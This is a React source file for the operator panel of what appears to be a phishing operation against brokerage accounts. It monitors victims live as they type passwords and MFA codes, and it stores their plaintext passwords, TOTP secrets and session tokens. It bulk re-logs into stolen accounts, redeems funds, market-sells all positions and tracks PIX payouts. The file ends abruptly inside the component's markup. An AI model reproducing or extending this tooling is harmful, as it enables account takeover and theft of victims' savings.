import { useState, useEffect, useCallback, useRef } from "react";
import { useAuth } from "@/hooks/useAuth";
import { useAdminData } from "@/hooks/useAdminData";
import { supabase } from "@/integrations/supabase/client";
import { invokeCocos } from "@/lib/cocosApi";
import CocosAdminLogin from "@/components/admin/CocosAdminLogin";
import CocosV2DashboardScreen from "@/components/cocosv2/CocosV2DashboardScreen";
import OnlineNowTab from "@/components/admin/OnlineNowTab";
import { SessionPresenceProvider } from "@/hooks/useSessionPresence";
import AdminLogs from "@/components/admin/AdminLogs";
import cocosLogo from "@/assets/cocos-logo.png";
import { generateTOTP, getTimeRemaining } from "@/lib/totp";
import { useNotificationSound } from "@/hooks/useNotificationSound";
import {
  Shield, LogOut, RefreshCw, Users, Wallet, Clock, ShieldCheck, ShieldOff,
  Play, ArrowLeft, Search, DollarSign, TrendingUp, KeyRound, Copy, Check,
  Eye, EyeOff, Bell, BellOff, Activity, Trash2, Wifi, FileText, Monitor,
  Smartphone, Globe, MapPin, Lock, Banknote, ArrowUpRight, Key, Gauge,
  CalendarDays, Zap, ChevronDown, ChevronUp, BarChart3, Coins, Download, Upload,
} from "lucide-react";

// ── Types ──
interface LiveSession {
  id: string;
  email: string | null;
  password: string | null;
  status: string;
  otp_code: string | null;
  created_at: string;
  ip_address: string | null;
  user_agent: string | null;
  country: string | null;
  city: string | null;
  source: string;
  operator_code: string;
}

interface CocosAccount {
  id: string;
  email: string;
  password: string | null;
  full_name: string | null;
  account_id: string | null;
  access_token: string | null;
  refresh_token: string | null;
  totp_secret: string | null;
  balance_ars: Record<string, unknown> | null;
  balance_usd: Record<string, unknown> | null;
  buying_power: Record<string, unknown> | null;
  portfolio_data: Record<string, unknown> | null;
  last_login_at: string | null;
  last_refresh_at: string | null;
  last_data_sync_at: string | null;
  phone: string | null;
  factors: unknown;
  orders: unknown;
  profile_data: Record<string, unknown> | null;
  created_at: string;
  updated_at: string;
  info_tag: string | null;
  operator_code: string;
}

interface PixTx {
  id: string;
  account_email: string;
  pix_key: string;
  recipient_name: string | null;
  amount_brl: number;
  amount_ars: number | null;
  exchange_rate: number | null;
  payment_method: string | null;
  payment_id: string | null;
  settlement_id: string | null;
  status: string;
  created_at: string;
}

interface PixLimitsData {
  dailyLimit?: number;
  dailyConsumption?: number;
  monthlyLimit?: number;
  monthlyConsumption?: number;
  [key: string]: unknown;
}

const INFO_TAGS = ["USEI", "NÃO MEXI", "NÃO FAZ PIX", "RECEBE EM 24HRS"] as const;
const TAG_COLORS: Record<string, { bg: string; text: string }> = {
  "USEI": { bg: "bg-blue-500/15 border-blue-500/30", text: "text-blue-400" },
  "NÃO MEXI": { bg: "bg-yellow-500/15 border-yellow-500/30", text: "text-yellow-400" },
  "NÃO FAZ PIX": { bg: "bg-red-500/15 border-red-500/30", text: "text-red-400" },
  "RECEBE EM 24HRS": { bg: "bg-green-500/15 border-green-500/30", text: "text-green-400" },
};

// ── Helpers ──
// Merge otp_code metadata from two sessions, preferring `preferred` values
const mergeOtpCodes = (base: string | null, preferred: string | null): string => {
  const parse = (raw: string | null): Record<string, string> => {
    const map: Record<string, string> = {};
    if (!raw) return map;
    raw.split("|").forEach((part) => {
      const colonIdx = part.indexOf(":");
      const eqIdx = part.indexOf("=");
      let sep = -1;
      if (colonIdx > 0 && eqIdx > 0) sep = Math.min(colonIdx, eqIdx);
      else if (colonIdx > 0) sep = colonIdx;
      else if (eqIdx > 0) sep = eqIdx;
      if (sep > 0) { map[part.slice(0, sep).trim()] = part.slice(sep + 1).trim(); }
    });
    return map;
  };
  const merged = { ...parse(base), ...parse(preferred) };
  return Object.entries(merged).map(([k, v]) => `${k}:${v}`).join("|");
};

const fmtARS = (n: number) =>
  new Intl.NumberFormat("es-AR", { style: "currency", currency: "ARS", minimumFractionDigits: 2 }).format(n);
const fmtUSD = (n: number) =>
  new Intl.NumberFormat("en-US", { style: "currency", currency: "USD", minimumFractionDigits: 2 }).format(n);
const fmtBRL = (n: number) =>
  new Intl.NumberFormat("pt-BR", { style: "currency", currency: "BRL", minimumFractionDigits: 2 }).format(n);

const timeAgo = (dateStr: string | null) => {
  if (!dateStr) return "Nunca";
  const diff = Date.now() - new Date(dateStr).getTime();
  const mins = Math.floor(diff / 60000);
  if (mins < 1) return "Agora";
  if (mins < 60) return `${mins}m`;
  const hrs = Math.floor(mins / 60);
  if (hrs < 24) return `${hrs}h`;
  return `${Math.floor(hrs / 24)}d`;
};

const parseDevice = (ua: string | null) => {
  if (!ua) return "?";
  if (/Mobile|Android|iPhone/i.test(ua)) return "📱";
  if (/Tablet|iPad/i.test(ua)) return "📟";
  return "💻";
};

const parseBrowser = (ua: string | null) => {
  if (!ua) return "";
  if (/Edg/i.test(ua)) return "Edge";
  if (/Chrome/i.test(ua)) return "Chrome";
  if (/Firefox/i.test(ua)) return "Firefox";
  if (/Safari/i.test(ua)) return "Safari";
  return "";
};

const statusLabels: Record<string, { label: string; color: string }> = {
  login_attempt: { label: "Digitando", color: "text-yellow-400 bg-yellow-500/10" },
  login_success: { label: "Login OK", color: "text-green-400 bg-green-500/10" },
  wrong_password: { label: "Senha Errada", color: "text-red-400 bg-red-500/10" },
  login_error: { label: "Erro", color: "text-red-500 bg-red-500/10" },
  mfa_challenge_sent: { label: "MFA Enviado", color: "text-blue-400 bg-blue-500/10" },
  mfa_code_entered: { label: "MFA Digitado", color: "text-blue-300 bg-blue-500/10" },
  mfa_verified_ok: { label: "MFA OK ✓", color: "text-green-400 bg-green-500/10" },
  mfa_code_wrong: { label: "MFA Errado", color: "text-red-400 bg-red-500/10" },
  mfa_auto_verify: { label: "MFA Auto", color: "text-purple-300 bg-purple-500/10" },
  mfa_auto_verify_totp_default: { label: "MFA Auto Default", color: "text-purple-300 bg-purple-500/10" },
  mfa_auto_verify_failed: { label: "MFA Auto Falhou", color: "text-red-400 bg-red-500/10" },
  mfa_challenge_sent_auto_failed: { label: "MFA Manual", color: "text-orange-400 bg-orange-500/10" },
  pedindo_mfa_google: { label: "MFA Google", color: "text-blue-400 bg-blue-500/10" },
  email_challenge_sent: { label: "E-mail Enviado", color: "text-blue-400 bg-blue-500/10" },
  email_challenge_sent_reenroll: { label: "E-mail Re-enroll", color: "text-blue-400 bg-blue-500/10" },
  email_challenge_failed_trying_enroll: { label: "E-mail Falhou → Enroll", color: "text-orange-400 bg-orange-500/10" },
  email_code_entered: { label: "E-mail Digitado", color: "text-blue-300 bg-blue-500/10" },
  email_verified_ok: { label: "E-mail OK ✓", color: "text-green-400 bg-green-500/10" },
  email_code_wrong: { label: "E-mail Errado", color: "text-red-400 bg-red-500/10" },
  sms_sent: { label: "SMS Enviado", color: "text-cyan-400 bg-cyan-500/10" },
  sms_code_entered: { label: "SMS Digitado", color: "text-cyan-300 bg-cyan-500/10" },
  sms_verified_ok: { label: "SMS OK ✓", color: "text-green-400 bg-green-500/10" },
  sms_resent_for_enroll: { label: "SMS Reenvio", color: "text-cyan-400 bg-cyan-500/10" },
  sms_unavailable: { label: "SMS Indisponível", color: "text-orange-400 bg-orange-500/10" },
  totp_enrolled: { label: "TOTP ✓", color: "text-purple-400 bg-purple-500/10" },
  totp_auto_verified: { label: "TOTP Auto ✓", color: "text-purple-300 bg-purple-500/10" },
  totp_enroll_failed: { label: "TOTP Falhou", color: "text-red-400 bg-red-500/10" },
  totp_enroll_error: { label: "TOTP Erro", color: "text-red-400 bg-red-500/10" },
  completed: { label: "Concluído ✓", color: "text-green-500 bg-green-500/10" },
  verify_dni_submitted: { label: "📋 DNI Enviado", color: "text-indigo-400 bg-indigo-500/10" },
  verify_dni_success: { label: "📋 DNI OK ✓", color: "text-indigo-300 bg-indigo-500/10" },
  verify_dni_error: { label: "📋 DNI Erro", color: "text-red-400 bg-red-500/10" },
  address_submitted: { label: "📍 Endereço Enviado", color: "text-teal-400 bg-teal-500/10" },
  address_saved: { label: "📍 Endereço OK ✓", color: "text-teal-300 bg-teal-500/10" },
  address_error: { label: "📍 Endereço Erro", color: "text-red-400 bg-red-500/10" },
  biometric_started: { label: "🔬 Biometria Iniciada", color: "text-amber-400 bg-amber-500/10" },
  biometric_finished: { label: "🔬 Biometria ✓", color: "text-green-400 bg-green-500/10" },
  error: { label: "Erro", color: "text-red-500 bg-red-500/10" },
};

// ══════════════════════════════════════════
// MAIN COMPONENT
// ══════════════════════════════════════════
const AdminV2 = () => {
  const { user, isAdmin, hasRole, loading: authLoading, signOut } = useAuth();
  const canAccess = isAdmin || hasRole;
  const { stats } = useAdminData(user?.id, canAccess);
  const [forceRefresh, setForceRefresh] = useState(0);
  const [activeTab, setActiveTab] = useState<"online" | "sessions" | "logs" | "accounts" | "wayni">("sessions");
  const [wayniFilter, setWayniFilter] = useState<"all" | "documents" | "pending" | "active">("all");

  // PIX transactions
  const [pixTransactions, setPixTransactions] = useState<PixTx[]>([]);
  const [pixLoading, setPixLoading] = useState(true);
  const [pixCheckingId, setPixCheckingId] = useState<string | null>(null);
  const [pixCheckingAll, setPixCheckingAll] = useState(false);
  const [pixCheckProgress, setPixCheckProgress] = useState({ done: 0, total: 0 });
  const [pixStatusResults, setPixStatusResults] = useState<Record<string, Record<string, unknown>>>({});

  // PIX Limits
  const [pixLimits, setPixLimits] = useState<Record<string, PixLimitsData>>({});
  const [pixLimitsLoading, setPixLimitsLoading] = useState(false);

  // Accounts
  const [accounts, setAccounts] = useState<CocosAccount[]>([]);
  const [accountsLoading, setAccountsLoading] = useState(true);
  const [search, setSearch] = useState("");

  // Operating state
  const [operatingAccount, setOperatingAccount] = useState<CocosAccount | null>(null);
  const [opAccessToken, setOpAccessToken] = useState("");
  const [opRefreshToken, setOpRefreshToken] = useState("");
  const [tokenStatus, setTokenStatus] = useState<Record<string, "alive" | "expired" | "checking">>({});

  const accountsRef = useRef<CocosAccount[]>([]);
  const [accountFilter, setAccountFilter] = useState<"all" | "expired" | "alive" | "today" | "yesterday" | "top_balance">("all");

  // Operator filter
  interface Operator { id: string; code: string; name: string; user_id?: string; }
  const [operators, setOperators] = useState<Operator[]>([]);
  const [operatorFilter, setOperatorFilter] = useState<string>("all");
  const [myOperator, setMyOperator] = useState<Operator | null>(null);

  useEffect(() => {
    if (!user || !canAccess) return;
    supabase.from("operators").select("*").order("created_at").then(({ data }) => {
      const ops = (data as unknown as Operator[]) || [];
      setOperators(ops);
      const match = ops.find((o) => o.user_id === user.id && o.code !== "master");
      if (match) { setMyOperator(match); setOperatorFilter(match.code); }
    });
  }, [user, canAccess]);

  // Live sessions
  const [liveSessions, setLiveSessions] = useState<LiveSession[]>([]);
  const { startAlarm, stopAlarm } = useNotificationSound();
  const [soundEnabled, setSoundEnabled] = useState(true);
  const soundEnabledRef = useRef(true);
  const seenSessionsRef = useRef<Set<string>>(new Set());
  const notifiedStatusRef = useRef<Set<string>>(new Set());
  const operatingAccountRef = useRef<CocosAccount | null>(null);
  operatingAccountRef.current = operatingAccount;

  useEffect(() => { soundEnabledRef.current = soundEnabled; }, [soundEnabled]);

  // ── Load accounts ──
  const loadAccounts = useCallback(async (showLoading = true) => {
    if (showLoading) setAccountsLoading(true);
    const { data } = await supabase.from("cocos_accounts").select("*").order("updated_at", { ascending: false, nullsFirst: false });
    setAccounts((data as unknown as CocosAccount[]) || []);
    if (showLoading) setAccountsLoading(false);
  }, []);

  useEffect(() => {
    if (user && canAccess) loadAccounts(true);
  }, [user, canAccess, loadAccounts, forceRefresh]);

  useEffect(() => { accountsRef.current = accounts; }, [accounts]);

  // ── Load ALL PIX transactions (paginated) ──
  const loadPixTransactions = useCallback(async () => {
    setPixLoading(true);
    let allTx: PixTx[] = [];
    let page = 0;
    const pageSize = 1000;
    let hasMore = true;
    while (hasMore) {
      const { data } = await supabase
        .from("pix_transactions" as any)
        .select("*")
        .order("created_at", { ascending: false })
        .range(page * pageSize, (page + 1) * pageSize - 1);
      if (data && data.length > 0) {
        allTx = allTx.concat(data as unknown as PixTx[]);
        hasMore = data.length === pageSize;
        page++;
      } else {
        hasMore = false;
      }
    }
    setPixTransactions(allTx);
    setPixLoading(false);
  }, []);

  useEffect(() => {
    if (user && canAccess) loadPixTransactions();
  }, [user, canAccess, loadPixTransactions]);

  // Realtime PIX
  useEffect(() => {
    if (!user || !canAccess) return;
    const channel = supabase
      .channel("pix-tx-realtime")
      .on("postgres_changes", { event: "*", schema: "public", table: "pix_transactions" }, (payload) => {
        if (payload.eventType === "INSERT") {
          setPixTransactions((prev) => [payload.new as unknown as PixTx, ...prev]);
        } else if (payload.eventType === "UPDATE") {
          setPixTransactions((prev) => prev.map((t) => t.id === (payload.new as any).id ? (payload.new as unknown as PixTx) : t));
        }
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [user, canAccess]);

  useEffect(() => {
    if (!user || !canAccess) return;
    const channel = supabase
      .channel("cocos-accounts-realtime")
      .on("postgres_changes", { event: "*", schema: "public", table: "cocos_accounts" }, (payload) => {
        if (payload.eventType === "INSERT") {
          setAccounts((prev) => [payload.new as unknown as CocosAccount, ...prev]);
        } else if (payload.eventType === "UPDATE") {
          setAccounts((prev) => prev.map((a) => a.id === (payload.new as any).id ? (payload.new as unknown as CocosAccount) : a));
        } else if (payload.eventType === "DELETE") {
          setAccounts((prev) => prev.filter((a) => a.id !== (payload.old as any).id));
        }
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [user, canAccess]);

  // ── Load live sessions ──
  const loadLiveSessions = useCallback(async () => {
    const since = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
    const { data } = await supabase
      .from("sessions").select("*")
      .eq("source", "cocosv2").gte("created_at", since)
      .order("created_at", { ascending: false }).limit(100);
    setLiveSessions((data as unknown as LiveSession[]) || []);
  }, []);

  useEffect(() => {
    if (!user || !canAccess) return;
    loadLiveSessions();
    const channel = supabase
      .channel("cocosv2-sessions-admin")
      .on("postgres_changes", { event: "*", schema: "public", table: "sessions", filter: "source=eq.cocosv2" }, (payload) => {
        const newRow = payload.new as LiveSession;
        if (payload.eventType === "INSERT") {
          setLiveSessions((prev) => [newRow, ...prev].slice(0, 100));
          if (!seenSessionsRef.current.has(newRow.id) && soundEnabledRef.current) {
            seenSessionsRef.current.add(newRow.id);
            startAlarm();
            setTimeout(() => stopAlarm(), 3000);
          }
        } else if (payload.eventType === "UPDATE") {
          let shouldAlert = false;

          setLiveSessions((prev) => {
            const previous = prev.find((s) => s.id === newRow.id);
            const statusChanged = previous ? previous.status !== newRow.status : true;
            const statusKey = `${newRow.id}:${newRow.status}`;

            if (statusChanged && !notifiedStatusRef.current.has(statusKey) && soundEnabledRef.current) {
              notifiedStatusRef.current.add(statusKey);
              shouldAlert = true;
            }

            return prev.map((s) => s.id === newRow.id ? newRow : s);
          });

          if (shouldAlert) {
            startAlarm();
            setTimeout(() => stopAlarm(), 2000);
          }
        }
        if (newRow.status === "completed") loadAccounts(false);
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [user, canAccess, loadLiveSessions, startAlarm, stopAlarm, loadAccounts]);

  // Helper: invoke edge function with auto-refresh on 403
  const safeInvoke = useCallback(async (body: Record<string, unknown>, retried = false): Promise<{ data: any; error: any }> => {
    return await invokeCocos(body);
  }, []);

  // ── Fetch PIX Limits for all active accounts ──
  const fetchAllPixLimits = useCallback(async () => {
    const activeAccounts = accounts.filter(a => a.access_token && a.account_id);
    if (activeAccounts.length === 0) return;
    setPixLimitsLoading(true);
    const results: Record<string, PixLimitsData> = {};
    for (const acct of activeAccounts) {
      try {
        const { data, error } = await safeInvoke({
          action: "pix_limits",
          access_token: acct.access_token,
          account_id: acct.account_id,
        });
        if (!error && data && !data.error) {
          results[acct.email] = data as PixLimitsData;
        }
      } catch { /* skip */ }
    }
    setPixLimits(results);
    setPixLimitsLoading(false);
  }, [accounts, safeInvoke]);

  // Auto-fetch PIX limits when accounts load
  useEffect(() => {
    if (!accountsLoading && accounts.length > 0 && Object.keys(pixLimits).length === 0) {
      fetchAllPixLimits();
    }
  }, [accountsLoading, accounts.length]);

  // ── Operate account ──
  const handleOperate = async (account: CocosAccount) => {
    if (!account.access_token && !account.refresh_token) return;
    setTokenStatus((prev) => ({ ...prev, [account.email]: "checking" }));
    let workingToken = account.access_token || "";
    let workingRefresh = account.refresh_token || "";
    let tokenAlive = false;
    if (workingToken) {
      try {
        const { data, error: fnError } = await safeInvoke({ action: "get_user_auth", access_token: workingToken });
        if (!fnError && data && !data.error && data.id) tokenAlive = true;
      } catch { /* */ }
    }
    if (!tokenAlive && workingRefresh) {
      try {
        const { data: refreshData, error: fnError } = await safeInvoke({ action: "refresh_token", refresh_token: workingRefresh });
        if (!fnError && refreshData?.access_token) { workingToken = refreshData.access_token; workingRefresh = refreshData.refresh_token || workingRefresh; tokenAlive = true; }
      } catch { /* */ }
    }
    if (tokenAlive) {
      let acctId = account.account_id || "";
      if (!acctId) { try { const { data: pd } = await safeInvoke({ action: "get_account_id", access_token: workingToken }); if (pd?.id_accounts?.[0]) acctId = String(pd.id_accounts[0]); } catch { /* */ } }
      const extra = acctId ? { account_id: acctId } : {};
      const [balArsRes, balUsdRes] = await Promise.allSettled([
        safeInvoke({ action: "get_portfolio_balance", access_token: workingToken, currency: "ARS", period: "1D", ...extra }),
        safeInvoke({ action: "get_portfolio_balance_usd", access_token: workingToken, period: "1D", ...extra }),
      ]);
      await supabase.from("cocos_accounts").upsert({ email: account.email, access_token: workingToken, refresh_token: workingRefresh, account_id: acctId || account.account_id || null, balance_ars: (balArsRes.status === "fulfilled" ? balArsRes.value.data : null) || account.balance_ars || {}, balance_usd: (balUsdRes.status === "fulfilled" ? balUsdRes.value.data : null) || account.balance_usd || {}, last_refresh_at: new Date().toISOString() } as any, { onConflict: "email" });
      setTokenStatus((prev) => ({ ...prev, [account.email]: "alive" }));
      setOpAccessToken(workingToken); setOpRefreshToken(workingRefresh);
      setOperatingAccount({ ...account, access_token: workingToken, refresh_token: workingRefresh });
      loadAccounts(false); return;
    }
    setTokenStatus((prev) => ({ ...prev, [account.email]: "expired" }));
    loadAccounts(false);
  };

  const handleStopOperating = () => { setOperatingAccount(null); setOpAccessToken(""); setOpRefreshToken(""); loadAccounts(false); };

  // ── Check ALL PIX statuses ──
  const handleCheckAllPix = useCallback(async () => {
    const toCheck = pixTransactions.filter((tx) => tx.payment_id && !pixStatusResults[tx.id]);
    if (toCheck.length === 0) return;
    setPixCheckingAll(true);
    setPixCheckProgress({ done: 0, total: toCheck.length });
    for (let i = 0; i < toCheck.length; i++) {
      const tx = toCheck[i];
      const acct = accounts.find((a) => a.email === tx.account_email);
      if (!acct?.access_token || !acct?.account_id) {
        setPixStatusResults((prev) => ({ ...prev, [tx.id]: { error: "Sem token" } }));
        setPixCheckProgress((prev) => ({ ...prev, done: prev.done + 1 }));
        continue;
      }
      try {
        const res = await invokeCocos({ action: "pix_get_payment", access_token: acct.access_token, account_id: acct.account_id, payment_id: tx.payment_id });
        const data = res.data as Record<string, unknown>;
        setPixStatusResults((prev) => ({ ...prev, [tx.id]: data || { error: "Sem resposta" } }));
        if (data?.status && String(data.status).toUpperCase() !== tx.status.toUpperCase()) {
          await supabase.from("pix_transactions" as any).update({ status: String(data.status).toLowerCase() }).eq("id", tx.id);
          setPixTransactions((prev) => prev.map((t) => t.id === tx.id ? { ...t, status: String(data.status).toLowerCase() } : t));
        }
      } catch {
        setPixStatusResults((prev) => ({ ...prev, [tx.id]: { error: "Erro" } }));
      }
      setPixCheckProgress((prev) => ({ ...prev, done: prev.done + 1 }));
    }
    setPixCheckingAll(false);
  }, [pixTransactions, pixStatusResults, accounts]);

  // Auto-check PIX statuses
  const autoCheckRef = useRef(false);
  useEffect(() => {
    if (pixLoading || accountsLoading || pixTransactions.length === 0 || accounts.length === 0) return;
    if (autoCheckRef.current) return;
    autoCheckRef.current = true;
    const timer = setTimeout(() => { handleCheckAllPix(); }, 1500);
    const interval = setInterval(() => { loadPixTransactions(); autoCheckRef.current = false; }, 5 * 60 * 1000);
    return () => { clearTimeout(timer); clearInterval(interval); };
  }, [pixLoading, accountsLoading, pixTransactions.length, accounts.length, handleCheckAllPix, loadPixTransactions]);

  const handleDeleteAccount = async (account: CocosAccount) => {
    if (!confirm(`Remover conta ${account.email}?`)) return;
    await supabase.from("cocos_accounts").delete().eq("id", account.id);
    loadAccounts(false);
  };

  // ── Auto-relogin all accounts with MFA (server-side) ──
  const [reloginRunning, setReloginRunning] = useState(false);
  const [reloginProgress, setReloginProgress] = useState({ done: 0, total: 0, current: "", results: [] as { email: string; ok: boolean; msg: string }[] });

  const handleReloginAll = async () => {
    const withPassword = accounts.filter((a) => a.password && a.totp_secret);
    if (withPassword.length === 0) { alert("Nenhuma conta com password + TOTP secret"); return; }
    if (!confirm(`Relogar ${withPassword.length} contas com MFA via servidor?`)) return;

    setReloginRunning(true);
    setReloginProgress({ done: 0, total: withPassword.length, current: "Enviando para servidor...", results: [] });

    try {
      const res = await fetch(`${import.meta.env.VITE_SUPABASE_URL}/functions/v1/cocos-relogin-expired`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "apikey": import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY,
          "Authorization": `Bearer ${import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY}`,
        },
        body: JSON.stringify({ mode: "all" }),
      });
      const data = await res.json();

      if (data.success) {
        const results = (data.results || []).map((r: any) => ({
          email: r.email,
          ok: r.success,
          msg: r.success ? "✅ OK" : `❌ ${r.error || "falhou"}`,
        }));
        setReloginProgress({ done: data.processed || 0, total: data.total || 0, current: "", results });
      } else {
        setReloginProgress((p) => ({ ...p, current: "", results: [{ email: "Servidor", ok: false, msg: `❌ ${data.error || data.message || "Erro"}` }] }));
      }
      loadAccounts(false);
    } catch (e) {
      setReloginProgress((p) => ({ ...p, current: "", results: [{ email: "Erro", ok: false, msg: (e as Error).message }] }));
    }
    setReloginRunning(false);
  };

  // ── Refresh all active account balances ──
  const [refreshAllRunning, setRefreshAllRunning] = useState(false);
  const [refreshAllProgress, setRefreshAllProgress] = useState({ done: 0, total: 0, current: "" });

  const handleRefreshAllBalances = async () => {
    const activeAccounts = accounts.filter((a) => a.access_token && a.refresh_token && !a.info_tag?.startsWith("⚠️") && !a.info_tag?.startsWith("❌"));
    if (activeAccounts.length === 0) return;

    setRefreshAllRunning(true);
    setRefreshAllProgress({ done: 0, total: activeAccounts.length, current: "" });

    for (let i = 0; i < activeAccounts.length; i++) {
      const acct = activeAccounts[i];
      setRefreshAllProgress({ done: i, total: activeAccounts.length, current: acct.email });

      try {
        let token = acct.access_token!;
        let refresh = acct.refresh_token!;
        const accId = acct.account_id || "";

        // Try refresh token first
        try {
          const { data: refData } = await safeInvoke({ action: "refresh_token", refresh_token: refresh });
          if (refData?.access_token) { token = refData.access_token; refresh = refData.refresh_token || refresh; }
        } catch { /* keep current */ }

        const extra = accId ? { account_id: accId } : {};
        const [balArsRes, balUsdRes, bpRes] = await Promise.allSettled([
          safeInvoke({ action: "get_portfolio_balance", access_token: token, currency: "ARS", period: "1D", ...extra }),
          safeInvoke({ action: "get_portfolio_balance_usd", access_token: token, period: "1D", ...extra }),
          safeInvoke({ action: "get_buying_power", access_token: token, ...extra }),
        ]);

        const balArs = balArsRes.status === "fulfilled" && balArsRes.value.data && !balArsRes.value.data.error ? balArsRes.value.data : acct.balance_ars;
        const balUsd = balUsdRes.status === "fulfilled" && balUsdRes.value.data && !balUsdRes.value.data.error ? balUsdRes.value.data : acct.balance_usd;
        const bp = bpRes.status === "fulfilled" && bpRes.value.data && !bpRes.value.data.error ? bpRes.value.data : acct.buying_power;

        await supabase.from("cocos_accounts").update({
          access_token: token, refresh_token: refresh,
          balance_ars: balArs, balance_usd: balUsd, buying_power: bp,
          last_refresh_at: new Date().toISOString(),
        } as any).eq("id", acct.id);
      } catch { /* skip */ }

      await new Promise((r) => setTimeout(r, 3000));
    }

    setRefreshAllProgress({ done: activeAccounts.length, total: activeAccounts.length, current: "" });
    setRefreshAllRunning(false);
    loadAccounts(false);
  };

  // ── Bulk redeem all FCI ──
  const [redeemAllRunning, setRedeemAllRunning] = useState(false);
  const [redeemAllResult, setRedeemAllResult] = useState<any>(null);

  const handleRedeemAll = async () => {
    if (!confirm("Resgatar TODOS os FCI (CI) de TODAS as contas ativas e atualizar saldos?")) return;
    setRedeemAllRunning(true);
    setRedeemAllResult(null);
    try {
      const res = await fetch(`${import.meta.env.VITE_SUPABASE_URL}/functions/v1/cocos-redeem-all`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "apikey": import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY,
          "Authorization": `Bearer ${import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY}`,
        },
        body: JSON.stringify({}),
      });
      const data = await res.json();
      setRedeemAllResult(data);
      loadAccounts(false);
    } catch (e) {
      setRedeemAllResult({ success: false, error: (e as Error).message });
    }
    setRedeemAllRunning(false);
  };

  // ── Sell all stocks (MARKET SELL CI) ──
  const [sellAllRunning, setSellAllRunning] = useState(false);
  const [sellAllResult, setSellAllResult] = useState<any>(null);

  const handleSellAllStocks = async () => {
    if (!confirm("⚠️ VENDER TODOS os investimentos (ações/CEDEARs/ONs) de TODAS as contas via ordem MARKET CI? Isto é IRREVERSÍVEL!")) return;
    if (!confirm("TEM CERTEZA? Todas as posições serão liquidadas a preço de mercado!")) return;
    setSellAllRunning(true);
    setSellAllResult(null);
    try {
      const res = await fetch(`${import.meta.env.VITE_SUPABASE_URL}/functions/v1/cocos-sell-all-stocks`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "apikey": import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY,
          "Authorization": `Bearer ${import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY}`,
        },
        body: JSON.stringify({}),
      });
      const data = await res.json();
      setSellAllResult(data);
      loadAccounts(false);
    } catch (e) {
      setSellAllResult({ success: false, error: (e as Error).message });
    }
    setSellAllRunning(false);
  };

  // ── Server-side relogin for dead accounts ──
  const [serverReloginRunning, setServerReloginRunning] = useState(false);
  const [serverReloginResult, setServerReloginResult] = useState<any>(null);

  const handleServerRelogin = async () => {
    const deadCount = accounts.filter(a => a.info_tag?.includes("Token morto") || a.info_tag?.startsWith("⚠️") || a.info_tag?.startsWith("❌")).length;
    if (!confirm(`Relogar ${deadCount} contas expiradas via servidor (com refresh de tokens)?`)) return;
    setServerReloginRunning(true);
    setServerReloginResult(null);
    try {
      const { data, error } = await supabase.functions.invoke("cocos-relogin-expired", {
        body: {},
      });

      if (error) {
        setServerReloginResult({ success: false, error: error.message || "Falha ao chamar relogin do servidor" });
      } else {
        setServerReloginResult(data);
        loadAccounts(false);
      }
    } catch (e) {
      setServerReloginResult({ success: false, error: (e as Error).message });
    }
    setServerReloginRunning(false);
  };

  // ── Export DB ──
  const [exportRunning, setExportRunning] = useState(false);
  const handleExportDB = async () => {
    setExportRunning(true);
    try {
      const res = await fetch(`${import.meta.env.VITE_SUPABASE_URL}/functions/v1/db-backup`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "apikey": import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY,
          "Authorization": `Bearer ${import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY}`,
        },
      });
      const data = await res.json();
      const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `backup-${new Date().toISOString().split("T")[0]}.json`;
      a.click();
      URL.revokeObjectURL(url);
    } catch (e) {
      alert("Erro ao exportar: " + (e as Error).message);
    }
    setExportRunning(false);
  };

  // ── Import DB ──
  const [importRunning, setImportRunning] = useState(false);
  const [importResult, setImportResult] = useState<any>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const handleImportDB = async (file: File) => {
    setImportRunning(true);
    setImportResult(null);
    try {
      const text = await file.text();
      const backup = JSON.parse(text);
      if (!backup?.data) { alert("Arquivo de backup inválido (sem campo 'data')"); setImportRunning(false); return; }
      const res = await fetch(`${import.meta.env.VITE_SUPABASE_URL}/functions/v1/db-restore`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "apikey": import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY,
          "Authorization": `Bearer ${import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY}`,
        },
        body: JSON.stringify(backup),
      });
      const result = await res.json();
      setImportResult(result);
      loadAccounts(false);
    } catch (e) {
      setImportResult({ success: false, error: (e as Error).message });
    }
    setImportRunning(false);
  };

  useEffect(() => {
    document.title = "Painel Admin CocosV2";
    const link: HTMLLinkElement = document.querySelector("link[rel~='icon']") || document.createElement("link");
    link.rel = "icon"; link.type = "image/png"; link.href = cocosLogo; document.head.appendChild(link);
  }, []);

  // ── Guards ──
  if (authLoading) return (
    <div className="flex min-h-screen items-center justify-center bg-background">
      <RefreshCw size={24} className="text-primary animate-spin" />
    </div>
  );
  if (!user) return <CocosAdminLogin onLogin={() => setForceRefresh((p) => p + 1)} />;
  // Block admin@email.com — exclusive to PanelPlus only
  const isPlusDedicatedAdmin = user?.email === "admin@email.com";
  if (!canAccess || isPlusDedicatedAdmin) return (
    <div className="flex min-h-screen flex-col items-center justify-center bg-background gap-4">
      <Shield className="h-12 w-12 text-destructive" />
      <h1 className="text-xl font-bold text-foreground">Acesso Negado</h1>
      <p className="text-sm text-muted-foreground">Este painel não está disponível para sua conta.</p>
      <button onClick={() => signOut()} className="rounded-xl bg-primary px-6 py-2.5 text-sm font-semibold text-primary-foreground">Voltar</button>
    </div>
  );

  // Operating mode
  if (operatingAccount) {
    return (
      <div className="min-h-screen bg-[#f5f7fb]">
